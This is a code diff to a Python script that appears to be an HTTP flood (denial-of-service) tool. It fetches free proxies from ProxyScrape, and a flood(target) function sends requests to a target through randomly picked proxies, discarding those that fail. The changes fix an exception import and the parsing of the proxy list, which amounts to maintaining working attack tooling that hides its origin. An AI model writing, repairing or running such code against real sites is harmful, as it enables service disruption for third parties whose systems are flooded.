@@ -9,6 +9,7 @@ from typing import Dict, List
 import requests
 from colorama import Fore as F
 from requests.exceptions import ConnectionError, Timeout, ProxyError
+from urllib3.exceptions import ProxySchemeUnknown  # Import ProxySchemeUnknown from urllib3
 
 # Ignore warnings for unverified HTTPS requests
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
@@ -24,7 +25,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
         List[Dict[str, str]]: A list containing dictionaries with http and https proxies.
     """
     try:
-        # Fetch proxy list from proxyscrape
+        # Fetch proxy list from the updated ProxyScrape API
         with requests.get(
             "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text",
             verify=False,
@@ -32,7 +33,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
             # Ensure each proxy has schema for both HTTP and HTTPS
             proxies = [
                 {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-                for proxy in proxy_list.text.split("\r\n") if proxy
+                for proxy in proxy_list.text.split("\n") if proxy
             ]
     except Timeout:
         print(f"\n{F.RED}[!] {F.CYAN}Could not connect to the proxy source!{F.RESET}")
@@ -77,7 +78,7 @@ def flood(target: str) -> None:
         proxy = random.choice(proxies)
         # Send a GET request with selected proxy and headers
         response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
-    except (Timeout, OSError, ProxyError, requests.exceptions.ProxySchemeUnknown):
+    except (Timeout, OSError, ProxyError, ProxySchemeUnknown):  # Use ProxySchemeUnknown from urllib3
         # Remove invalid proxy from the list
         try:
             proxies.remove(proxy)
